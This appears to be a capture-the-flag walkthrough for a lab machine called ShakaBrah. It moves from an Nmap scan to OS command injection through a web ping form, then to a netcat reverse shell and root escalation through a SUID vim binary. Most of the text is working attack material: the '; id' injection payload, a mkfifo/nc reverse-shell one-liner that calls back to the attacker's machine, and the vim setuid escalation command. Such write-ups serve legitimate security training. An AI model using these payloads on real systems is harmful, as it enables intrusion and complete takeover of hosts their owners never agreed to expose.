# Exploitation Guide for ShakaBrah 

## Enumeration

We start the enumeration process with a simple Nmap scan:
```
kali@kali:~/# nmap 192.168.83.134
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 03:54 EDT
Nmap scan report for 192.168.83.134
Host is up (0.00041s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We find port 80 is open and visit it in our browser as a first step. On the page we find a form allowing us to specify a host and verify the server's connectivity to that host. Specifying `localhost` we see the following output which indicates the server is running the `ping` command.
```
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.057 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.042 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3070ms
rtt min/avg/max/mdev = 0.022/0.044/0.057/0.014 ms
```

## Exploitation

It appears as though the server concatenates the host we specify with the string `ping -c 4 ` and then executes it via a shell. If the appropriate validation or sanitisation is not performed we can exploit this to inject our own commands. We will verify this by attempting to run the `id` command using the following payload: `; id`. The semicolon is the Bash command separator, allowing us to run the `id` command after `ping` has finished executing. The output below shows that our assumption was correct and we can inject and execute any OS command we wish.
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To exploit this we will first start a Netcat handler listening on port 80 to catch our reverse shell.
```
kali@kali:~/# sudo nc -lvp 80
listening on [any] 80 ...
```

We will then submit the following payload containing a reverse shell to the connectivity verification web site.
```
;rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c "cat /tmp/x | /bin/sh -i 2>&1 | nc kali 80 > /tmp/x"
```

We then catch our reverse shell and upgrade to a full TTY using Python.
```
kali@kali:~/# sudo nc -lvp 80
listening on [any] 80 ...
192.168.83.134: inverse host lookup failed: Unknown host
connect to [kali] from (UNKNOWN) [192.168.83.134] 55428
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@shakabrah:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@shakabrah:/var/www/html$
```

## Escalation

To escalate our privilege to `root` we will first enumerate all SUID binaries on the system.
```
www-data@shakabrah:/var/www/html$ find / -perm -4000 2> /dev/null
find / -perm -4000 2> /dev/null
/bin/mount
/bin/su
/bin/ping
/bin/umount
/bin/fusermount
...
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/vim.basic
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
```

One which should suit our needs perfectly is `/usr/bin/vim.basic`. We can exploit this as follows.
```
www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
<; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
```

After skipping over some struggles Vim has with our not fully functional terminal, we can see that we did indeed obtain `root` access.
```
root@shakabrah:/var/www/html# id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@shakabrah:/var/www/html#
```
